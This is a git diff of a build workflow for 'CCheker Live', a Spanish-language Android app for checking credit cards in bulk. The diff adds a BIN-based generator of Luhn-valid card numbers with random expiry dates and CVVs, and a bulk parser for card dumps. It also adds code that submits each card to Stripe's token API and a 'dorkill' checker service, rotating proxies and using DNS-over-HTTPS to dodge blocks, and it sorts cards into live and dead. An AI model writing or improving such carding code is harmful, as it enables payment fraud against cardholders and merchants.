@@ -14,22 +14,23 @@ jobs:
 
       - uses: subosito/flutter-action@v2
         with:
-          flutter-version: '3.24.5'
+          flutter-version: '3.22.2'
           channel: stable
           cache: true
 
       - name: Preparar proyecto
         run: |
-          echo "=== CCheker Live v5.1 · auditoria aplicada ==="
+          set -e
+          echo "=== CCheker Live v6.0 ==="
           flutter create --org com.cchekerx --project-name ccheker_live --platforms android ccheker_live
           cd ccheker_live
           rm -rf lib test
           mkdir -p lib/screens
+          rm -rf android/app/src/main/res/mipmap-anydpi-v26
 
       - name: Icono propio
         run: |
           cd ccheker_live
-          rm -rf android/app/src/main/res/mipmap-anydpi-v26
           cat > /tmp/make_icon.py <<'PY'
           import math, struct, zlib, os, sys
 
@@ -128,15 +129,39 @@ jobs:
           PY
           python3 /tmp/make_icon.py android/app/src/main/res
 
-      - name: Generar app
+      - name: Parche Android
+        run: |
+          cd ccheker_live
+          set -e
+          MAN=android/app/src/main/AndroidManifest.xml
+          sed -i 's/android:label="ccheker_live"/android:label="CCheker Live"/' "$MAN"
+          sed -i 's|<application|<uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.USE_BIOMETRIC"/>\n    <uses-permission android:name="android.permission.USE_FINGERPRINT"/>\n    <application|' "$MAN"
+
+          MA=$(find android/app/src/main/kotlin -name "MainActivity.kt" | head -n1)
+          PKG=$(echo "$MA" | sed 's|android/app/src/main/kotlin/||; s|/MainActivity.kt||; s|/|.|g')
+          cat > "$MA" <<KT
+          package $PKG
+
+          import io.flutter.embedding.android.FlutterFragmentActivity
+
+          class MainActivity : FlutterFragmentActivity()
+          KT
+
+          GR=android/app/build.gradle
+          sed -i 's/minSdkVersion flutter.minSdkVersion/minSdkVersion 23/' "$GR" || true
+          sed -i 's/minSdkVersion 21/minSdkVersion 23/' "$GR" || true
+          sed -i 's/minSdkVersion 19/minSdkVersion 23/' "$GR" || true
+          echo "android parcheado"
+
+      - name: Escribir codigo
         run: |
           cd ccheker_live
 
           cat > pubspec.yaml <<'YAML'
           name: ccheker_live
-          description: Checker de tarjetas con cola masiva por isolates y boveda cifrada.
+          description: Checker masivo de tarjetas con boveda cifrada, cola por isolates y buscador de fuentes.
           publish_to: 'none'
-          version: 5.1.0+6
+          version: 6.0.0+10
 
           environment:
             sdk: '>=3.3.0 <4.0.0'
@@ -177,14 +202,23 @@ jobs:
           import 'dart:math';
 
           const appName = 'CCheker Live';
-          const appVersion = '5.1.0';
-          const appBuild = '5.1.0+6';
-          const appTag = 'v5.1';
+          const appVersion = '6.0.0';
+          const appBuild = '6.0.0+10';
+          const appTag = 'v6.0';
 
           const stripePk = 'pk_test_51UQWXHLSAWNUOV2fKgvafDXscpBBbd067QkfHEDeEkCZvHJht7LyA43wccu1iX4OBPgbGFxtzwmKI6GMS4akzx0O00xWOD8V42';
           const stripeTokenUrl = 'https://api.stripe.com/v1/tokens';
-          const dorkillUrl = 'https://api.dorkill.com/v1/check';
+          const dorkillUrl = 'https://www.dorkill.com/api/check';
+          const binlistUrl = 'https://lookup.binlist.net/';
           const defaultProbe = 'https://www.google.com/generate_204';
+
+          final _onlyDigits = RegExp(r'\D');
+          final _allDigits = RegExp(r'^\d+$');
+          final _alpha = RegExp(r'[A-Za-z]');
+
+          String digitsOf(String s) => s.replaceAll(_onlyDigits, '');
+          bool isDigits(String s) => s.isNotEmpty && _allDigits.hasMatch(s);
+          bool hasAlpha(String s) => _alpha.hasMatch(s);
 
           String newId() {
             const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
@@ -193,7 +227,7 @@ jobs:
           }
 
           String maskPan(String pan) {
-            if (pan.length < 10) return pan;
+            if (pan.length <= 10) return pan;
             return '${pan.substring(0, 6)}******${pan.substring(pan.length - 4)}';
           }
 
@@ -215,6 +249,8 @@ jobs:
             final r = s % 60;
             return '${m}m ${r}s';
           }
+
+          String year4(int yy) => yy >= 100 ? '$yy' : '${2000 + yy}';
 
           int luhnSum(String pan) {
             var sum = 0;
@@ -246,6 +282,22 @@ jobs:
               if (luhn(cand)) return cand;
             }
             return pan;
+          }
+
+          String completeLuhn(String partial) {
+            var sum = 0;
+            var alt = true;
+            for (var i = partial.length - 1; i >= 0; i--) {
+              var d = partial.codeUnitAt(i) - 48;
+              if (d < 0 || d > 9) return partial;
+              if (alt) {
+                d *= 2;
+                if (d > 9) d -= 9;
+              }
+              sum += d;
+              alt = !alt;
+            }
+            return '$partial${(10 - (sum % 10)) % 10}';
           }
 
           String schemeOf(String pan) {
@@ -513,16 +565,19 @@ jobs:
                     border: Border.all(color: c.withOpacity(0.5)),
                   ),
                   child: Row(
-                    mainAxisSize: MainAxisSize.min,
+                    mainAxisSize: expand ? MainAxisSize.max : MainAxisSize.min,
                     mainAxisAlignment: MainAxisAlignment.center,
                     children: [
                       if (icon != null) ...[Icon(icon, size: 16, color: c), const SizedBox(width: 8)],
-                      Text(
-                        label,
-                        maxLines: 1,
-                        softWrap: false,
-                        overflow: TextOverflow.ellipsis,
-                        style: TextStyle(fontSize: 13, fontWeight: FontWeight.w700, color: c),
+                      Flexible(
+                        child: Text(
+                          label,
+                          maxLines: 1,
+                          softWrap: false,
+                          overflow: TextOverflow.ellipsis,
+                          textAlign: TextAlign.center,
+                          style: TextStyle(fontSize: 13, fontWeight: FontWeight.w700, color: c),
+                        ),
                       ),
                     ],
                   ),
@@ -619,7 +674,7 @@ jobs:
             Widget build(BuildContext context) => ClipRRect(
                   borderRadius: BorderRadius.circular(6),
                   child: LinearProgressIndicator(
-                    value: value.clamp(0, 1).toDouble(),
+                    value: value.clamp(0.0, 1.0),
                     minHeight: 10,
                     backgroundColor: AppColors.glass,
                     valueColor: AlwaysStoppedAnimation<Color>(color),
@@ -682,7 +737,7 @@ jobs:
             void start() {
               _sub?.cancel();
               _sub = Connectivity().onConnectivityChanged.listen(_apply);
-              Connectivity().checkConnectivity().then(_apply).catchError((_) {});
+              Connectivity().checkConnectivity().then(_apply).catchError((Object _) {});
               _beat ??= Timer.periodic(const Duration(seconds: 25), (_) => ping());
             }
 
@@ -695,9 +750,10 @@ jobs:
 
             void _apply(List<ConnectivityResult> res) {
               final was = online;
+              final wasWifi = wifi;
               online = res.isNotEmpty && !res.contains(ConnectivityResult.none);
               wifi = res.contains(ConnectivityResult.wifi) || res.contains(ConnectivityResult.ethernet);
-              if (was != online) _ctrl.add(null);
+              if (was != online || wasWifi != wifi) _ctrl.add(null);
               _tune();
             }
 
@@ -715,11 +771,8 @@ jobs:
             }
 
             void _tune() {
-              if (!autoTune) {
-                _ctrl.add(null);
-                return;
-              }
-              concurrency = !online
+              if (!autoTune) return;
+              final next = !online
                   ? 2
                   : latencyMs == 0
                       ? 5
@@ -728,6 +781,8 @@ jobs:
                           : latencyMs < 900
                               ? 5
                               : 2;
+              if (next == concurrency) return;
+              concurrency = next;
               _ctrl.add(null);
             }
 
@@ -747,7 +802,7 @@ jobs:
                       .timeout(const Duration(seconds: 6));
                   if (r.statusCode != 200) continue;
                   final j = jsonDecode(r.body) as Map<String, dynamic>;
-                  final ans = (j['Answer'] as List?) ?? const [];
+                  final ans = (j['Answer'] as List?) ?? const <dynamic>[];
                   final ips = ans
                       .where((a) => (a as Map)['type'] == 1)
                       .map((a) => (a as Map)['data'] as String)
@@ -756,7 +811,7 @@ jobs:
                   if (ips.isNotEmpty) return ips;
                 } catch (_) {}
               }
-              return const [];
+              return const <String>[];
             }
           }
           DART
@@ -815,6 +870,7 @@ jobs:
 
             bool get expired => isExpired(expMonth, expYear);
             String get expLabel => '${expMonth.toString().padLeft(2, '0')}/${expYear.toString().padLeft(2, '0')}';
+            String get expLabel4 => '${expMonth.toString().padLeft(2, '0')}/${year4(expYear)}';
             String get line => '$pan|${expMonth.toString().padLeft(2, '0')}|${expYear.toString().padLeft(2, '0')}|$cvv';
 
             CreditCard copyWith({
@@ -978,7 +1034,6 @@ jobs:
               this.autoTune = true,
               this.doh = true,
               this.proxySticky = false,
-              this.wifiOnly = true,
               this.concurrency = 6,
               this.timeoutSec = 20,
               this.probeUrl = defaultProbe,
@@ -995,7 +1050,6 @@ jobs:
             final bool autoTune;
             final bool doh;
             final bool proxySticky;
-            final bool wifiOnly;
             final int concurrency;
             final int timeoutSec;
             final String probeUrl;
@@ -1012,7 +1066,6 @@ jobs:
               bool? autoTune,
               bool? doh,
               bool? proxySticky,
-              bool? wifiOnly,
               int? concurrency,
               int? timeoutSec,
               String? probeUrl,
@@ -1029,7 +1082,6 @@ jobs:
                   autoTune: autoTune ?? this.autoTune,
                   doh: doh ?? this.doh,
                   proxySticky: proxySticky ?? this.proxySticky,
-                  wifiOnly: wifiOnly ?? this.wifiOnly,
                   concurrency: concurrency ?? this.concurrency,
                   timeoutSec: timeoutSec ?? this.timeoutSec,
                   probeUrl: probeUrl ?? this.probeUrl,
@@ -1047,7 +1099,6 @@ jobs:
                   'autoTune': autoTune,
                   'doh': doh,
                   'proxySticky': proxySticky,
-                  'wifiOnly': wifiOnly,
                   'concurrency': concurrency,
                   'timeout': timeoutSec,
                   'probe': probeUrl,
@@ -1065,7 +1116,6 @@ jobs:
                   autoTune: (j['autoTune'] ?? true) as bool,
                   doh: (j['doh'] ?? true) as bool,
                   proxySticky: (j['proxySticky'] ?? false) as bool,
-                  wifiOnly: (j['wifiOnly'] ?? true) as bool,
                   concurrency: ((j['concurrency'] ?? 6) as num).toInt(),
                   timeoutSec: ((j['timeout'] ?? 20) as num).toInt(),
                   probeUrl: (j['probe'] ?? defaultProbe).toString(),
@@ -1092,6 +1142,7 @@ jobs:
           DART
 
           cat > lib/repos.dart <<'DART'
+          import 'dart:async';
           import 'dart:convert';
           import 'dart:math';
 
@@ -1107,10 +1158,12 @@ jobs:
             Map<String, dynamic> data = {};
             bool _unlocked = false;
             String _pass = '';
+            Timer? _debounce;
 
             bool get hasPassword => (_sp?.getString('vault_hash') ?? '').isNotEmpty;
             bool get unlocked => _unlocked;
             bool get setupDone => _sp?.getBool('setup_done') ?? false;
+            bool get bioEnabled => _sp?.getBool('bio_on') ?? false;
 
             Future<void> boot() async {
               _sp = await SharedPreferences.getInstance();
@@ -1121,6 +1174,11 @@ jobs:
 
             Future<void> markSetup() async {
               await _sp?.setBool('setup_done', true);
+            }
+
+            Future<void> setBioEnabled(bool v) async {
+              await _sp?.setBool('bio_on', v);
+              if (!v) await forgetPass();
             }
 
             Future<bool> unlock(String pass) async {
@@ -1148,6 +1206,7 @@ jobs:
                 await _sp!.remove('vault_blob');
                 await _sp!.remove('vault_salt');
                 await _sp!.remove('vault_bio');
+                await _sp!.remove('bio_on');
                 _pass = '';
                 _unlocked = true;
                 await save();
@@ -1159,6 +1218,7 @@ jobs:
               await _sp!.setString('vault_hash', _hash(pass, salt));
               _pass = pass;
               _unlocked = true;
+              if (_sp!.containsKey('vault_bio')) await rememberPass();
               await save();
             }
 
@@ -1208,8 +1268,15 @@ jobs:
 
             Future<void> save() async {
               if (!_unlocked) return;
+              _debounce?.cancel();
               final txt = jsonEncode(data);
               await _sp!.setString('vault_blob', _pass.isEmpty ? txt : _encrypt(txt));
+            }
+
+            void saveSoon() {
+              if (!_unlocked) return;
+              _debounce?.cancel();
+              _debounce = Timer(const Duration(milliseconds: 500), save);
             }
 
             String _key() => _hash(_pass, _sp!.getString('vault_salt') ?? '').substring(0, 32);
@@ -1235,37 +1302,55 @@ jobs:
           import 'core.dart';
           import 'models.dart';
 
-          final _sep = RegExp(r'[\s|,;:\t]+');
+          final _strong = RegExp(r'[|,;:\t=]+');
+          final _weak = RegExp(r'\s+');
 
-          List<int>? _date(String t) {
-            final d = t.replaceAll(RegExp(r'\D'), '');
+          List<String> _tokens(String line) {
+            final out = <String>[];
+            for (final chunk in line.split(_strong)) {
+              for (final t in chunk.trim().split(_weak)) {
+                if (t.isNotEmpty) out.add(t);
+              }
+            }
+            return out;
+          }
+
+          (int, int)? _readDate(String d) {
             if (d.length == 4) {
-              final mm = int.parse(d.substring(0, 2));
-              final yy = int.parse(d.substring(2));
-              if (mm >= 1 && mm <= 12) return [mm, yy];
+              final a = int.parse(d.substring(0, 2));
+              final b = int.parse(d.substring(2));
+              if (a >= 1 && a <= 12) return (a, b);
+              if (b >= 1 && b <= 12) return (b, a);
               return null;
             }
             if (d.length == 6) {
-              final mm = int.parse(d.substring(0, 2));
-              final yy = int.parse(d.substring(4));
-              if (mm >= 1 && mm <= 12) return [mm, yy];
-              return null;
-            }
-            if (d.length == 3) {
-              final mm = int.parse(d.substring(0, 1));
-              final yy = int.parse(d.substring(1));
-              if (mm >= 1 && mm <= 9) return [mm, yy];
+              final a = int.parse(d.substring(0, 2));
+              if (a >= 1 && a <= 12) return (a, int.parse(d.substring(4)));
               return null;
             }
             if (d.length == 5) {
-              final mm = int.parse(d.substring(0, 2));
-              final yy = int.parse(d.substring(3));
-              if (mm >= 1 && mm <= 12) return [mm, yy];
+              final a = int.parse(d.substring(0, 2));
+              if (a >= 1 && a <= 12) return (a, int.parse(d.substring(3)));
+              return null;
             }
             return null;
           }
 
-          ImportResult parseCards(String input, {bool repairLuhn = true}) {
+          int? _readMonth(String d) {
+            if (d.length >= 1 && d.length <= 2) {
+              final v = int.parse(d);
+              if (v >= 1 && v <= 12) return v;
+            }
+            return null;
+          }
+
+          int? _readYear(String d) {
+            if (d.length == 4) return int.parse(d.substring(2));
+            if (d.length <= 2) return int.parse(d);
+            return null;
+          }
+
+          ImportResult parseCards(String input, {bool repairLuhn = true, bool strictScheme = false}) {
             final out = <CreditCard>[];
             final seen = <String>{};
             var dup = 0;
@@ -1277,22 +1362,36 @@ jobs:
               final line = rawLine.trim();
               if (line.isEmpty) continue;
 
-              final tok = line.split(_sep).where((s) => s.isNotEmpty).toList();
+              final tok = _tokens(line);
               if (tok.isEmpty) {
                 junk++;
                 continue;
               }
 
               String? pan;
-              var panIdx = -1;
-              for (var i = 0; i < tok.length; i++) {
-                final d = tok[i].replaceAll(RegExp(r'\D'), '');
-                if (d.length >= 12 && d.length <= 19) {
-                  pan = d;
-                  panIdx = i;
-                  break;
+              var pStart = -1;
+              var pEnd = -1;
+
+              for (var i = 0; i < tok.length && pan == null; i++) {
+                var merged = digitsOf(tok[i]);
+                if (merged.isEmpty) continue;
+                var j = i;
+                while (j + 1 < tok.length) {
+                  final nxt = tok[j + 1];
+                  if (!isDigits(nxt)) break;
+                  if (merged.length + nxt.length > 19) break;
+                  final cont = merged.length < 12 ? nxt.length <= 6 : (nxt.length == 4 && merged.length % 4 == 0);
+                  if (!cont) break;
+                  merged += nxt;
+                  j++;
+                }
+                if (merged.length >= 12 && merged.length <= 19) {
+                  pan = merged;
+                  pStart = i;
+                  pEnd = j;
                 }
               }
+
               if (pan == null) {
                 junk++;
                 continue;
@@ -1303,26 +1402,45 @@ jobs:
               var cvv = '';
 
               for (var i = 0; i < tok.length; i++) {
-                if (i == panIdx) continue;
+                if (i >= pStart && i <= pEnd) continue;
                 final t = tok[i];
-                final d = t.replaceAll(RegExp(r'\D'), '');
-                if (d.isEmpty) continue;
+                final d = digitsOf(t);
+                if (d.isEmpty || hasAlpha(t)) continue;
 
                 if (mm == 0) {
-                  final dt = _date(t);
-                  if (dt != null) {
-                    mm = dt[0];
-                    yy = dt[1];
+                  final rd = _readDate(d);
+                  if (rd != null) {
+                    mm = rd.$1;
+                    yy = rd.$2;
+                    continue;
+                  }
+                  final m = _readMonth(d);
+                  if (m != null) {
+                    mm = m;
+                    continue;
+                  }
+                  if (d.length == 2 || d.length == 4) {
+                    final y = _readYear(d);
+                    if (y != null) {
+                      yy = y;
+                      continue;
+                    }
+                  }
+                }
+
+                if (mm != 0 && yy == 0 && (d.length == 2 || d.length == 4)) {
+                  final y = _readYear(d);
+                  if (y != null) {
+                    yy = y;
                     continue;
                   }
                 }
+
                 if (cvv.isEmpty && (d.length == 3 || d.length == 4)) cvv = d;
               }
 
-              if (mm == 0 || yy == 0) {
-                mm = 12;
-                yy = 29;
-              }
+              if (mm == 0) mm = 12;
+              if (yy == 0) yy = (DateTime.now().year + 4) % 100;
 
               if (repairLuhn && !luhn(pan)) {
                 final f = fixLuhn(pan);
@@ -1330,6 +1448,11 @@ jobs:
                   pan = f;
                   fixed++;
                 }
+              }
+
+              if (strictScheme && schemeOf(pan) == 'otra') {
+                junk++;
+                continue;
               }
 
               if (seen.contains(pan)) {
@@ -1355,10 +1478,322 @@ jobs:
           }
           DART
 
-          if (code == 'incorrect_cvc') {
-                  return CheckResult(status: CheckStatus.dead, message: 'cvv incorrecto', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
+          cat > lib/bin_gen.dart <<'DART'
+          import 'dart:math';
+
+          import 'core.dart';
+          import 'models.dart';
+
+          class GenSpec {
+            const GenSpec({
+              required this.bin,
+              this.count = 10,
+              this.length = 16,
+              this.month = 0,
+              this.year = 0,
+              this.cvv = '',
+            });
+            final String bin;
+            final int count;
+            final int length;
+            final int month;
+            final int year;
+            final String cvv;
+          }
+
+          List<CreditCard> generateCards(GenSpec spec) {
+            final bin = digitsOf(spec.bin);
+            if (bin.length < 4) return const <CreditCard>[];
+
+            final r = Random();
+            final scheme = schemeOf(bin);
+            final amex = scheme == 'amex';
+
+            var len = spec.length;
+            if (len <= bin.length) len = amex ? 15 : 16;
+            if (amex && len == 16) len = 15;
+            len = len.clamp(bin.length + 1, 19).toInt();
+
+            final now = DateTime.now();
+            final out = <CreditCard>[];
+            final seen = <String>{};
+            var guard = 0;
+
+            while (out.length < spec.count && guard < spec.count * 60 + 500) {
+              guard++;
+              final b = StringBuffer(bin);
+              while (b.length < len - 1) {
+                b.write(r.nextInt(10));
+              }
+              final pan = completeLuhn(b.toString());
+              if (!seen.add(pan)) continue;
+
+              final mm = spec.month >= 1 && spec.month <= 12 ? spec.month : 1 + r.nextInt(12);
+              final yy = spec.year >= 1 ? spec.year : (now.year % 100) + 2 + r.nextInt(6);
+              final cvv = spec.cvv.isNotEmpty
+                  ? spec.cvv
+                  : amex
+                      ? (1000 + r.nextInt(9000)).toString()
+                      : (100 + r.nextInt(900)).toString();
+
+              out.add(
+                CreditCard(
+                  id: newId(),
+                  pan: pan,
+                  expMonth: mm,
+                  expYear: yy,
+                  cvv: cvv,
+                  brand: scheme,
+                  bin: pan.length >= 6 ? pan.substring(0, 6) : pan,
+                ),
+              );
+            }
+            return out;
+          }
+          DART
+
+          cat > lib/checker.dart <<'DART'
+          import 'dart:convert';
+          import 'dart:io';
+          import 'dart:math';
+
+          import 'package:http/http.dart' as http;
+          import 'package:http/io_client.dart';
+
+          import 'core.dart';
+          import 'models.dart';
+          import 'net.dart';
+
+          class ProbeResult {
+            const ProbeResult({required this.ok, required this.ms});
+            final bool ok;
+            final int ms;
+          }
+
+          class CheckResult {
+            const CheckResult({
+              required this.status,
+              required this.message,
+              this.gateway = '',
+              this.latencyMs = 0,
+              this.binRaw = '',
+            });
+            final CheckStatus status;
+            final String message;
+            final String gateway;
+            final int latencyMs;
+            final String binRaw;
+          }
+
+          class CheckEngine {
+            CheckEngine(this.cfg, {List<ProxyNode>? proxies}) : _proxies = proxies ?? const <ProxyNode>[];
+
+            final Settings cfg;
+            final List<ProxyNode> _proxies;
+            final _rnd = Random();
+            final _clients = <String, http.Client>{};
+
+            List<ProxyNode> get proxies => _proxies;
+
+            http.Client _client(ProxyNode? p) {
+              final key = p == null ? 'direct' : '${p.kind.name}|${p.host}:${p.port}';
+
+              final cached = _clients[key];
+              if (cached != null) return cached;
+
+              final hc = HttpClient()
+                ..connectionTimeout = Duration(seconds: cfg.timeoutSec)
+                ..idleTimeout = const Duration(seconds: 20)
+                ..maxConnectionsPerHost = 8
+                ..userAgent = 'CChekerLive/6.0';
+
+              if (p != null) {
+                hc.findProxy = (_) =>
+                    p.kind == ProxyKind.socks5 ? 'SOCKS ${p.host}:${p.port}' : 'PROXY ${p.host}:${p.port}';
+
+                if (p.user.isNotEmpty) {
+                  final user = p.user;
+                  final pass = p.pass;
+                  hc.authenticateProxy = (host, port, scheme, realm) async {
+                    hc.addProxyCredentials(host, port, realm, HttpClientBasicCredentials(user, pass));
+                    return true;
+                  };
+                  hc.authenticate = (uri, scheme, realm) async {
+                    hc.addCredentials(uri, realm, HttpClientBasicCredentials(user, pass));
+                    return true;
+                  };
                 }
-                return CheckResult(status: CheckStatus.unknown, message: msg, gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
+              } else if (cfg.doh) {
+                hc.connectionFactory = _viaDoh;
+              }
+
+              final c = IOClient(hc);
+              _clients[key] = c;
+              return c;
+            }
+
+            Future<ConnectionTask<Socket>> _viaDoh(Uri uri, String? proxyHost, int? proxyPort) async {
+              final t = Duration(seconds: cfg.timeoutSec);
+
+              var target = uri.host;
+              if (InternetAddress.tryParse(target) == null) {
+                try {
+                  final ips = await NetSense.i.resolve(target);
+                  if (ips.isNotEmpty) target = ips.first;
+                } catch (_) {}
+              }
+
+              Socket raw;
+              try {
+                raw = await Socket.connect(target, uri.port, timeout: t);
+              } catch (_) {
+                if (target == uri.host) rethrow;
+                raw = await Socket.connect(uri.host, uri.port, timeout: t);
+              }
+
+              final Socket sock = uri.isScheme('https') ? await SecureSocket.secure(raw, host: uri.host) : raw;
+
+              return ConnectionTask.fromSocket(sock, Future<Socket>.value(sock));
+            }
+
+            void dispose() {
+              for (final c in _clients.values) {
+                c.close();
+              }
+              _clients.clear();
+            }
+
+            ProxyNode? _pick() {
+              if (!cfg.useProxies) return null;
+              final pool = _proxies.where((p) => p.health != ProxyHealth.down).toList();
+              if (pool.isEmpty) return null;
+              return pool[_rnd.nextInt(pool.length)];
+            }
+
+            String get _sk => cfg.stripeKey.isEmpty ? stripePk : cfg.stripeKey;
+
+            Future<String> fetchText(String url, {Map<String, String>? headers, int maxBytes = 8388608}) async {
+              final p = _pick();
+              final req = http.Request('GET', Uri.parse(url))
+                ..headers['User-Agent'] = 'Mozilla/5.0 (Linux; Android) CChekerLive/6.0'
+                ..headers['Accept'] = 'text/plain,text/html,application/json,*/*';
+              if (headers != null) req.headers.addAll(headers);
+
+              final res = await _client(p).send(req).timeout(Duration(seconds: cfg.timeoutSec));
+              if (res.statusCode != 200) throw HttpException('HTTP ${res.statusCode}');
+
+              final buf = <int>[];
+              await for (final chunk in res.stream) {
+                buf.addAll(chunk);
+                if (buf.length >= maxBytes) break;
+              }
+              return utf8.decode(buf, allowMalformed: true);
+            }
+
+            Future<ProbeResult> probe(ProxyNode? p) async {
+              final sw = Stopwatch()..start();
+              try {
+                final r = await _client(p).get(Uri.parse(cfg.probeUrl)).timeout(Duration(seconds: cfg.timeoutSec));
+                sw.stop();
+                return ProbeResult(ok: r.statusCode < 500, ms: sw.elapsedMilliseconds);
+              } catch (_) {
+                sw.stop();
+                return ProbeResult(ok: false, ms: sw.elapsedMilliseconds);
+              }
+            }
+
+            Future<String?> exitInfo(ProxyNode p) async {
+              try {
+                final r = await _client(p)
+                    .get(Uri.parse('https://api.ipify.org?format=json'))
+                    .timeout(Duration(seconds: cfg.timeoutSec));
+                if (r.statusCode != 200) return null;
+                return (jsonDecode(r.body) as Map<String, dynamic>)['ip'] as String?;
+              } catch (_) {
+                return null;
+              }
+            }
+
+            Future<CheckResult> check(CreditCard card) async {
+              final max = cfg.retries + 1;
+              var attempt = 0;
+
+              while (attempt < max) {
+                final p = _pick();
+                final r = cfg.engine == 'both'
+                    ? await _cascade(card, p)
+                    : cfg.engine == 'dorkill'
+                        ? await _dorkill(card, p)
+                        : await _stripe(card, p);
+
+                if (r.status != CheckStatus.unknown) return r;
+
+                attempt++;
+                if (attempt < max) await Future.delayed(Duration(milliseconds: NetSense.i.backoff(attempt)));
+              }
+
+              return const CheckResult(status: CheckStatus.unknown, message: 'sin respuesta');
+            }
+
+            Future<CheckResult> _stripe(CreditCard card, ProxyNode? p) async {
+              final sw = Stopwatch()..start();
+              try {
+                final r = await _client(p)
+                    .post(
+                      Uri.parse(stripeTokenUrl),
+                      headers: {
+                        'Authorization': 'Bearer $_sk',
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                      },
+                      body: {
+                        'card[number]': card.pan,
+                        'card[exp_month]': card.expMonth.toString().padLeft(2, '0'),
+                        'card[exp_year]': card.expYear.toString().padLeft(2, '0'),
+                        'card[cvc]': card.cvv,
+                      },
+                    )
+                    .timeout(Duration(seconds: cfg.timeoutSec));
+                sw.stop();
+
+                final ms = sw.elapsedMilliseconds;
+                final body = r.body.isEmpty ? <String, dynamic>{} : jsonDecode(r.body) as Map<String, dynamic>;
+
+                if (r.statusCode == 200 && body['id'] != null) {
+                  final cm = body['card'] as Map?;
+                  final brand = (cm?['brand'] ?? '').toString();
+                  return CheckResult(
+                    status: CheckStatus.live,
+                    message: brand.isEmpty ? 'aprobada' : 'aprobada · $brand',
+                    gateway: 'stripe',
+                    latencyMs: ms,
+                  );
+                }
+
+                if (r.statusCode == 429) {
+                  return CheckResult(status: CheckStatus.unknown, message: 'limite de stripe', gateway: 'stripe', latencyMs: ms);
+                }
+
+                final err = (body['error'] as Map?) ?? const <dynamic, dynamic>{};
+                final type = (err['type'] ?? '').toString();
+                final code = (err['code'] ?? '').toString();
+                final decline = (err['decline_code'] ?? '').toString();
+                final msg = (err['message'] ?? 'rechazada').toString();
+
+                CheckResult dead(String m) =>
+                    CheckResult(status: CheckStatus.dead, message: m, gateway: 'stripe', latencyMs: ms);
+
+                if (code == 'card_declined') return dead(decline.isEmpty ? 'declinada' : decline);
+                if (code == 'expired_card') return dead('vencida');
+                if (code == 'incorrect_number' || code == 'invalid_number') return dead('numero invalido');
+                if (code == 'incorrect_cvc') return dead('cvv incorrecto');
+                if (code == 'incorrect_zip') return dead('zip incorrecto');
+                if (code == 'processing_error') {
+                  return CheckResult(status: CheckStatus.unknown, message: 'error de proceso', gateway: 'stripe', latencyMs: ms);
+                }
+                if (type == 'invalid_request_error' && msg.toLowerCase().contains('api key')) {
+                  return CheckResult(status: CheckStatus.unknown, message: 'stripe key invalida', gateway: 'stripe', latencyMs: ms);
+                }
+                return CheckResult(status: CheckStatus.unknown, message: msg, gateway: 'stripe', latencyMs: ms);
               } catch (_) {
                 sw.stop();
                 return CheckResult(status: CheckStatus.unknown, message: 'red', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
@@ -1373,24 +1808,35 @@ jobs:
               final sw = Stopwatch()..start();
               try {
                 final uri = Uri.parse(dorkillUrl).replace(queryParameters: {
-                  'card': '${card.pan}|${card.expLabel}|${card.cvv}',
                   'key': cfg.dorkillKey,
+                  'card': '${card.pan}|${card.expMonth.toString().padLeft(2, '0')}|${year4(card.expYear)}|${card.cvv}',
                 });
                 final r = await _client(p).get(uri).timeout(Duration(seconds: cfg.timeoutSec));
                 sw.stop();
+                final ms = sw.elapsedMilliseconds;
 
-                final text = r.body.toLowerCase();
-                if (text.contains('"live"')  text.contains('approved')  text.contains('"charged":true')) {
-                  return CheckResult(status: CheckStatus.live, message: 'aprobada', gateway: 'dorkill', latencyMs: sw.elapsedMilliseconds);
+                final body = r.body.isEmpty ? <String, dynamic>{} : jsonDecode(r.body) as Map<String, dynamic>;
+                final status = (body['status'] ?? '').toString().toLowerCase();
+                final resp = (body['response'] ?? '').toString();
+                final binRaw = (body['bin'] ?? '').toString();
+
+                if (status == 'valid' || status == 'live' || status == 'approved') {
+                  return CheckResult(
+                    status: CheckStatus.live,
+                    message: resp.isEmpty ? 'aprobada' : resp,
+                    gateway: 'dorkill',
+                    latencyMs: ms,
+                    binRaw: binRaw,
+                  );
                 }
-                if (text.contains('declined')  text.contains('"status":"fail"')  text.contains('invalid')) {
-                  return CheckResult(status: CheckStatus.dead, message: 'declinada', gateway: 'dorkill', latencyMs: sw.elapsedMilliseconds);
+                if (status == 'declined' || status == 'dead' || status == 'invalid') {
+                  return CheckResult(status: CheckStatus.dead, message: resp.isEmpty ? 'declinada' : resp, gateway: 'dorkill', latencyMs: ms);
                 }
                 return CheckResult(
                   status: CheckStatus.unknown,
-                  message: text.length > 60 ? text.substring(0, 60) : text,
+                  message: resp.isEmpty ? 'sin estado (${r.statusCode})' : resp,
                   gateway: 'dorkill',
-                  latencyMs: sw.elapsedMilliseconds,
+                  latencyMs: ms,
                 );
               } catch (_) {
                 sw.stop();
@@ -1406,7 +1852,12 @@ jobs:
               if (b.status == CheckStatus.live) return b;
 
               if (a.status == CheckStatus.dead && b.status == CheckStatus.dead) {
-                return CheckResult(status: CheckStatus.dead, message: '${a.message} + ${b.message}', gateway: 'cascada', latencyMs: a.latencyMs + b.latencyMs);
+                return CheckResult(
+                  status: CheckStatus.dead,
+                  message: '${a.message} + ${b.message}',
+                  gateway: 'cascada',
+                  latencyMs: a.latencyMs + b.latencyMs,
+                );
               }
               if (a.status == CheckStatus.dead) return a;
               if (b.status == CheckStatus.dead) return b;
@@ -1416,6 +1867,7 @@ jobs:
           DART
 
           cat > lib/bin_db.dart <<'DART'
+          import 'dart:async';
           import 'dart:convert';
           import 'dart:io';
 
@@ -1428,11 +1880,15 @@ jobs:
             BinDb._();
             static final BinDb i = BinDb._();
 
-            static const _url = 'https://raw.githubusercontent.com/iann838/bin-list-data/master/bin-list-data.csv';
+            static const sources = [
+              'https://raw.githubusercontent.com/iannuttall/binlist-data/master/binlist-data.csv',
+              'https://raw.githubusercontent.com/venelinkochev/bin-list-data/master/bin-list-data.csv',
+            ];
 
             Map<String, BinInfo> _map = {};
 
             int get count => _map.length;
+            bool get ready => _map.isNotEmpty;
 
             Future<File> _file() async {
               final dir = await getApplicationDocumentsDirectory();
@@ -1444,48 +1900,133 @@ jobs:
               return File('${dir.path}/bin_index.json');
             }
 
-            Future<bool> installed() async => (await _file()).exists();
